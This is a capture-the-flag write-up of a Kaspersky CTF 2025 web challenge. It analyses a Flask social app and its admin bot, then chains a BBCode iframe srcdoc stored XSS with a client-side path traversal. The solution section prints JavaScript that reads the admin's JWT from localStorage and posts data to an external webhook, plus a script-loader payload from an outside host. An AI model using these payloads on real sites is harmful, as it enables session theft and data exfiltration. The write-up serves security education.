# WhiteDukesDZ - Kaspersky CTF 2025 Writeup: Bubble ReRevenge Challenge

![WhiteDukesDZ Logo](challenge/web-bubble-rerevenge-challenge.png)

In addition to the main application, we received a `challenge` directory containing all deployment and source files. This included:

- Docker and Docker Compose configurations for local and remote deployment.
- Backend source code.
- The admin bot implementation.
- Frontend build files.
- Nginx configuration for reverse proxying.

Having access to these resources allowed for thorough analysis and local testing of the challenge environment.

---

## Challenge Summary

This challenge featured a straightforward Python Flask web application that simulated a social media feed, allowing users to create posts, comment, and manage their profiles, all secured with JWT authentication. Additionally, an admin bot was present: whenever a post URL was submitted, the bot would visit and interact with it. The objective was to analyze the application for vulnerabilities and exploit them to obtain the flag.

## Application Analysis

After reviewing the `backend` files, we identified these main endpoints:

1. **`/auth/register` (Registration):**
    - Accepts `POST` requests with `username` and `password` in the request body.
    - Returns a `400` status if the `username` is shorter than 3 or longer than 100 characters.
    - Returns a `400` status if the `username` contains non-printable characters.
    - Returns a `400` status if the `password` is missing or shorter than 8 characters.
    - Returns a `409` status if the `username` already exists in the database.
    
    Otherwise, the new user is added to the database, JWT tokens are generated, and a `201` status is returned.

2. **`/auth/login` (Login):**
    - Accepts `POST` requests with `username` and `password` in the request body.
    - Returns a `401` status if the `username` does not exist or the `password` is incorrect.
    
    Otherwise, JWT tokens are generated for the user and a `200` status is returned.

3. **`/auth/logout` (Logout):**
    - Accepts a `POST` request with an empty body.
    
    The user's token is blacklisted, effectively logging them out, and a `200` status is returned.

4. **`/users/me` (Current User Information):**
    - Supports both `GET` and `PUT` requests; authentication is required.
    - On `GET`: Retrieves the current user's ID from the JWT token, fetches the corresponding user information from the database, and returns it with a `200` status.
    - On `PUT`: Retrieves the current user's ID from the JWT token and expects a `username` in the request body.
        - Returns a `400` status if the `username` is shorter than 3 or longer than 100 characters.
        - Returns a `400` status if the `username` contains non-printable characters.
        - Returns a `409` status if the `username` already exists in the database.
        
        If all checks pass, updates the `username` in the database and returns the updated user information with a `200` status.

5. **`/users/<user_id>` (Retrieve User Information):**

    - Accepts `GET` requests and requires authentication.
    - Retrieves the specified `user_id` from the request parameters and fetches the corresponding user information from the database.
    - Returns a `404` status if the user does not exist; otherwise, returns the user information with a `200` status.

6. **`/posts/` (Get Posts, Create Post):**
    - Accepts `GET`, `POST` requests; authentication is required.
    - If `GET`, supports pagination via `page` and `per_page` query parameters (with a maximum of 50 per page).
        - Returns a list of posts created by the current user, each including up to three most recent comments.
        - Responds with a JSON object containing the posts, pagination info, and a `200` status.
    - If `POST`, expects a JSON body with a `content` field (and optional `is_private` boolean).
        - Returns a `400` status if no data is provided, or if the `content` is empty or exceeds 2000 characters.
        - The post content is parsed using a <ins>BBCode parser</ins> and stored in both raw and HTML form.
        - If a draft exists for the user, it is deleted upon successful post creation.
        - On success, creates a new post in the database and returns a success message and the post data with a `201` status.
        - Returns a `500` status with error details if a database error occurs.

7. **`/posts/user/<user_id>/posts/<post_id>` (Get Specific Post):**
    - Accepts `GET`, `PUT`, `DELETE` requests; authentication is required.
    - If `GET`, validates the format of `post_id` and `user_id`.
        - Returns the post if found, or an error message with appropriate status code if not.
    - If `DELETE`, only allows the owner of the post to delete it.
        - Returns a `400` status if the post or user ID format is invalid.
        - Returns a `403` status if a user attempts to delete another user's post.
        - Returns a `404` status if the post does not exist.
        - On success, deletes the post and returns a success message with a `200` status.
        - Returns a `500` status with error details if a database error occurs.
    - If `PUT`, Validates the format of `post_id` and `user_id`.
        - Expects a JSON body with a `content` field.
        - Returns a `403` status if the user is not the owner of the post.
        - Returns a `400` status if the content is empty or exceeds 2000 characters.
        - The post content is parsed using a <ins>BBCode parser</ins> and stored in both raw and HTML form.
        - On success, creates a new post in the database and returns a success message and the post data with a `200` status.

8. **`/comments/user/<user_id>/posts/<post_id>` (Create Comment):**
    - Accepts `POST` requests; authentication is required.
    - Validates the format of `post_id` and `user_id`.
    - Expects a JSON body with a `content` field.
    - Returns a `400` status if the content is empty or exceeds 2000 characters.
    - The comment content is parsed using a <ins>BBCode parser</ins> and stored in HTML form.
    - If the post exists and the content is valid, creates a new comment and returns it with a `200` status.

9. **`/drafts/save` (Save Draft):**
    - Accepts `POST` requests; authentication is required.
    - Expects a JSON body with a `content` field.
    - Returns a `400` status if the content is empty or exceeds 2000 characters.
    - Saves the draft content in Redis, associated with the current user, and returns a success message and the draft data with a `200` status.

10. **`/drafts/load` (Load Draft):**
    - Accepts `GET` requests; authentication is required.
    - Loads the draft content for the current user from Redis.
    - If no draft is found, returns an empty list and a message; otherwise, returns the draft data and a success message with a `200` status.

All user content for both `posts` and `comments` is processed through a custom BBCode parser implemented in `bb_parser.py` (located in the `utils` folder):
    
    - `html.escape(text, quote=True)` is applied to ensure that any raw HTML input is neutralized. This prevents malicious users from injecting scripts, inline event handlers, or other HTML-based attacks.

### Admin Bot Implementation

The challenge includes an automated admin bot, implemented using Python and Selenium with a headless Chromium browser. The bot is responsible for simulating an admin user who interacts with the web application in a realistic way. Its main behaviors and security implications are as follows:

1. **Registration and Credential Management:**
    - On startup, the bot registers a new user with a random username and password, storing these credentials for future sessions.
    - The bot logs in using these credentials for all subsequent actions.

2. **Flag Handling:**
    - After registration, the bot reads the flag from a file and creates a private post containing the flag. This ensures the flag is only accessible to the admin account.

3. **Visiting User-Submitted URLs:**
    - The bot exposes a `visit(url)` function, which is triggered when a user submits a post URL for review.
    - The bot only visits URLs that match the `/post/` path on the service host, preventing arbitrary navigation and reducing the risk of SSRF or open redirect attacks.

4. **Interaction Logic:**
    - Upon visiting a post, the bot leaves a comment using a randomly selected, friendly message, and may also create a new post with a positive message.
    - All interactions are performed as the admin user, using the same browser session.

5. **Browser Security Settings:**
    - The bot runs Chromium in headless mode with a hardened set of flags: disabling GPU, sandboxing, device discovery, and XSS auditor, and using a dedicated user data directory.
    - The browser is configured to accept insecure certificates, but does not allow navigation to non-service URLs.

6. **Error Handling and Cleanup:**
    - The bot handles errors gracefully, logging tracebacks and ensuring the browser is closed after each run.

**Security Implications:**

- The bot's strict URL filtering and browser hardening are designed to mitigate common web exploitation vectors, such as XSS, CSRF, and SSRF, but any XSS in a post or comment viewed by the bot could potentially compromise the admin session and leak the flag.
- The use of Selenium and a real browser means that DOM-based and client-side vulnerabilities are in scope for exploitation.

### Security Observations

- When a `POST` request is made to `/api/drafts/save` with a `content` field, the content is stored directly in the database without any server-side sanitization. This means any user-supplied input, including malicious scripts, is preserved as-is.

- The frontend's BBCode parser, found in `frontend/build/static/js/main.03bd07b7.js`, is responsible for rendering user content. This function escapes HTML special characters and then replaces BBCode tags with their HTML equivalents. For `[img]`, it only allows a URL, but for `[youtube]`/`[yt]` it parses additional attributes and builds an `<iframe>`. However, it does not properly sanitize all attributes, especially for `[youtube]`/`[yt]`, which allows arbitrary attributes to be injected into the resulting HTML.

```js
function Fr(input) {
    let t = input;
    // Escape HTML special characters
    t = t.replace(/&/g, "&amp;")
         .replace(/</g, "&lt;")
         .replace(/>/g, "&gt;")
         .replace(/"/g, "&quot;")
         .replace(/'/g, "&#039;");
    // BBCode to HTML replacements
    t = t.replace(/\b\\[\/b\]/g, "<strong>$1</strong>");
    t = t.replace(/\i\\[\/i\]/g, "<em>$1</em>");
    t = t.replace(/\s\\[\/s\]/g, "<s>$1</s>");
    t = t.replace(/\u\\[\/u\]/g, "<u>$1</u>");
    t = t.replace(/\h1\\[\/h1\]/g, "<h1>$1</h1>");
    t = t.replace(/\url\\[\/url\]/g, '<a href="$1" target="_blank" rel="noopener">$1</a>');
    t = t.replace(/\[url=(https?:\/\/[^\]]+)\](.*?)\[\/url\]/g, '<a href="$1" target="_blank" rel="noopener">$2</a>');
    t = t.replace(/\img\\[\/img\]/g, '<img src="$1" alt="User posted image" style="max-width:100%;">');
    t = t.replace(/\quote\\[\/quote\]/g, "<blockquote>$1</blockquote>");
    t = t.replace(/\code\\[\/code\]/g, "<pre><code>$1</code></pre>");
    t = t.replace(/\list\\[\/list\]/g, (match, content) => {
        const items = content.split("[*]").filter(e => e.trim()).map(e => "<li>" + e.trim() + "</li>").join("");
        return "<ul>" + items + "</ul>";
    });
    t = t.replace(/\[(youtube|yt)(?:\s+([^\]]+))?\]/g, (match, tag, attrs) => {
        // ...parsing logic for [youtube]/[yt]...
    });
    return t;
}
```

- As a result, an attacker can craft a payload such as:

```bbc
[yt srcdoc=<script>alert('WhiteDukesDZ')</script>]
```

- After parsing, this produces the following HTML:

```html
<iframe srcdoc="<script>alert('WhiteDukesDZ')</script>" src="https://www.youtube.com/embed/ITQJhfN1ssC" width="560" height="315"></iframe>
```

### Stored XSS

This XSS payload will execute the JavaScript code `alert('WhiteDukesDZ')` in the victim's browser, either when previewing the draft or when loading it from `/api/drafts/load`.

![WhiteDukesDZ Logo](demonstration/web-bubble-rerevenge-drafts-xss.png)

This vulnerability can be exploited to execute arbitrary JavaScript in the context of the admin's session. The ultimate goal is to leverage this to access the admin account and retrieve the flag, which is stored in a private post only accessible to the admin.

To achieve this, we need to trick the admin bot into making a `POST` request to `/api/drafts/save` with our XSS payload as the content. Since the bot, after visiting our URL and commenting, will create a new post (which triggers a call to `/api/drafts/load`), our JavaScript will be executed in the admin's browser context.

### Delivering the XSS payload to the admin bot

When submitting a comment on a post, the frontend issues a `POST` request to `/api/comments/user/<user_id>/posts/<post_id>/` with the comment content in the body. Notably, this request structure and body format are identical to those used by `/api/drafts/save`.

![WhiteDukesDZ Logo](demonstration/web-bubble-rerevenge-comment.png)

Upon closer inspection of the frontend JavaScript (`frontend/build/static/js/main.03bd07b7.js`), we find the following relevant code:

```js
// Fetch paginated posts
fr = function(page = 1, perPage = 5) {
    return rr.get(`/api/posts?page=${page}&per_page=${perPage}`);
};
// Submit a comment
vr = (userId, postId, content) => rr.post(`/api/comments/user/${userId}/posts/${postId}`, { content });
```

Crucially, both `userId` and `postId` are under user control. This opens the door to a path traversal attack: by crafting a `postId` value that includes encoded slashes and traversal sequences, we can manipulate the resulting API endpoint.

For example, accessing a post at `/post/<user_id>/posts/<post_id>%2f.%09.%2f.%09.%2f.%09.%2f.%09.%2f.%09.%2fdrafts%2fsave` (where `%2f` is `/` and `%09` is a tab character) results in a backend path of `/api/drafts/save` after decoding and React's normalization. While this may display an error, the `username` is still shown—an important detail for later steps.

![WhiteDukesDZ Logo](demonstration/web-bubble-rerevenge-path.png)

If we now submit a comment to this crafted post URL, the frontend will send a `POST` request to `/api/comments/user/<user_id>/posts/<post_id>%2f.%09.%2f.%09.%2f.%09.%2f.%09.%2f.%09.%2fdrafts%2fsave`, which, after decoding, targets `/api/drafts/save` on the backend. This is possible because React strips `%09` and normalizes the path, allowing the traversal to succeed.

![WhiteDukesDZ Logo](demonstration/web-bubble-rerevenge-path-comment.png)

As a result, instead of posting a comment, the crafted request actually saves a draft—allowing us to deliver our XSS payload directly to the admin's drafts.

After reviewing `bot.py` notice that we control a part of the bot `comment` which is our `username` (the `username` of the post owner):

```python
text_input.send_keys(f"Dear {author_username.text},\n {random.choice(opinions)}")
```

This means that the bot's comment will always include the post owner's `username` as part of the message it submits. Since we fully control our own username, this provides a direct injection point for our payload.

Importantly, the application enforces a maximum username length of 100 characters. Therefore, any XSS payload we wish to inject via the username must fit within this constraint.

By carefully crafting a payload under 100 characters, we can ensure that when the bot comments on our post, it will unwittingly include our malicious input in its own comment. Due to the path traversal and draft-saving logic described earlier, this comment content will be stored as the admin's draft. When the bot subsequently creates a new post (which loads the draft), our XSS payload will execute in the admin's browser context, enabling us to proceed with flag exfiltration.

---

## Solution

Based on our analysis, obtaining the flag requires exploiting a stored XSS vulnerability to exfiltrate the admin's private post. The approach is to craft a payload with length <= 100 that, when executed in the admin bot's browser, fetches `/api/posts` (which includes the private flag post) and sends the data to a server we control.

A suitable JavaScript payload is:

```js
fetch('/api/posts',{method:'GET',headers:{'Authorization':'Bearer'+String.fromCharCode(32)+localStorage.getItem('DiarrheaTokenBearerInLocalStorageForSecureRequestsContactAdminHeKnowsHotToUseWeHaveManyTokensHereSoThisOneShouldBeUnique')}}).then(r=>r.json()).then(data=>fetch('https://YOUR_SERVER_OR_WEBHOOK',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:'posts='+encodeURIComponent(JSON.stringify(data.items))}))
```

In order to fit the <= 100 length constraint, we can include it in a external link. To deliver this payload, we use the vulnerable `[yt]` BBCode tag, injecting our JavaScript into the `srcdoc` attribute:

```html
[yt srcdoc=<script/src="//manini.alwaysdata.net/kss.js"></script>]
```

**Key points:**
- We avoid using a literal space character, as it would break the BBCode parsing.
- The JWT token is stored in local storage under a long, unique key, which we identified using DevTools:

  ![WhiteDukesDZ Logo](demonstration/web-bubble-revenge-localstorage.png)

**Attack Steps:**
1. **Change your username** to include the XSS payload (ensuring it is under 100 characters).
2. **Create a post** with any dummy content.
3. **Submit the crafted post URL (with path traversal)** to the admin bot for review.
4. **Wait for the bot** to visit your post. The bot will comment using your malicious username, which—due to the path traversal—causes the comment content to be saved as the admin's draft. When the bot later creates a new post, your XSS payload will execute in the admin's browser, exfiltrating the flag to your webhook.
5. **Retrieve the flag** from your server logs.

To automate this process, we developed a Python script (`solution/solve.py`) that registers a user with the XSS payload as `username`, creates the dummy post, submits it with the path traversal link to the bot, and fetches the flag from our webhook logs.

If successful, the script produces output similar to:

```sh
└─$ python3 solve.py
Account logged in successfully.
Post created successfully.
Submitted to bot successfully.
kaspersky{6ruh_6um6l3_1s_n0_m0r3}
```


